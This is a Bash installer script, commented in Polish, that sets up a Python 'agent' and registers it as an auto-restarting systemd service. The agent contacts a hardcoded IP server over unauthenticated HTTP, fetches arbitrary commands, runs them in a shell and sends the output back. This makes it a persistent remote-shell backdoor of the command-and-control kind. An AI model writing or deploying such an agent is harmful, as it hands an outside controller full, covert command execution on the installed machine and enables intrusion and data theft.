#!/bin/bash
set -e

AGENT_ID="$1"
if [ -z "$AGENT_ID" ]; then
  echo "Usage: bash install_agent.sh <agent_id>"
  exit 1
fi

echo "[install_agent] Instalacja agenta z ID: $AGENT_ID"

# Aktualizacja i python3 + venv
echo "[install_agent] Aktualizacja systemu i instalacja python3-venv"
sudo apt update
sudo apt install -y python3 python3-venv python3-pip curl

# Utworzenie katalogu agenta
AGENT_DIR="$HOME/agent_$AGENT_ID"
mkdir -p "$AGENT_DIR"

# Tworzenie i aktywacja virtualenv
python3 -m venv "$AGENT_DIR/venv"
source "$AGENT_DIR/venv/bin/activate"

# Instalacja biblioteki requests
pip install --upgrade pip
pip install requests

# Zapis agent.py
cat > "$AGENT_DIR/agent.py" << 'EOF'
import time, subprocess, requests, logging, os, sys

if len(sys.argv) != 2:
    print("Usage: python3 agent.py <agent_id>")
    sys.exit(1)

AGENT_ID = sys.argv[1]
SERVER = 'http://185.14.92.188:8000'
logging.basicConfig(level=logging.INFO, format='[AGENT:%(agent)s] %(message)s')

try:
    requests.post(f'{SERVER}/api/register/{AGENT_ID}')
    logging.info("Registered on server", extra={'agent': AGENT_ID})
except Exception as e:
    logging.error(f"Registration error: {e}", extra={'agent': AGENT_ID})

cwd = os.getcwd()

def get_command():
    try:
        r = requests.get(f'{SERVER}/api/command/{AGENT_ID}')
        return r.json().get('command','')
    except Exception as e:
        logging.error(f"GET cmd error: {e}", extra={'agent': AGENT_ID})
        return ''

def post_output(output):
    try:
        requests.post(f'{SERVER}/api/output/{AGENT_ID}', json={'output': output})
    except Exception as e:
        logging.error(f"POST out error: {e}", extra={'agent': AGENT_ID})

def main():
    global cwd
    last_cmd = None
    while True:
        cmd = get_command()
        if cmd and cmd != last_cmd:
            logging.info(f"Received: {cmd!r}", extra={'agent': AGENT_ID})
            if cmd == '__STOP__':
                logging.info("Stopping.", extra={'agent': AGENT_ID})
                post_output("[Agent stopped]")
                break

            parts = cmd.strip().split()
            if parts[0] == 'cd':
                target = parts[1] if len(parts)>1 else os.path.expanduser('~')
                try:
                    new_dir = target if os.path.isabs(target) else os.path.join(cwd, target)
                    os.chdir(new_dir)
                    cwd = os.getcwd()
                    out = f"Changed directory to {cwd}"
                except Exception as e:
                    out = f"cd error: {e}"
            else:
                try:
                    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd=cwd)
                    out = proc.stdout + proc.stderr
                except Exception as e:
                    out = f"Execution error: {e}"

            logging.info("Posting output.", extra={'agent': AGENT_ID})
            post_output(out)
            last_cmd = cmd
        time.sleep(1)

if __name__ == '__main__':
    main()
EOF

# Dezaktywuj virtualenv (dla bezpieczeństwa)
deactivate

# Tworzenie pliku systemd do automatycznego uruchamiania
SERVICE_FILE="/etc/systemd/system/agent_$AGENT_ID.service"
echo "[install_agent] Tworzenie usługi systemd: $SERVICE_FILE"

sudo bash -c "cat > $SERVICE_FILE" <<EOF
[Unit]
Description=Agent $AGENT_ID service
After=network.target

[Service]
User=$USER
WorkingDirectory=$AGENT_DIR
ExecStart=$AGENT_DIR/venv/bin/python $AGENT_DIR/agent.py $AGENT_ID
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

# Włączanie i start usługi
echo "[install_agent] Włączanie i uruchamianie usługi systemd"
sudo systemctl daemon-reload
sudo systemctl enable "agent_$AGENT_ID.service"
sudo systemctl start "agent_$AGENT_ID.service"

echo "[install_agent] Instalacja i uruchomienie agenta zakończone."
echo "[install_agent] Status usługi:"
sudo systemctl status "agent_$AGENT_ID.service" --no-pager
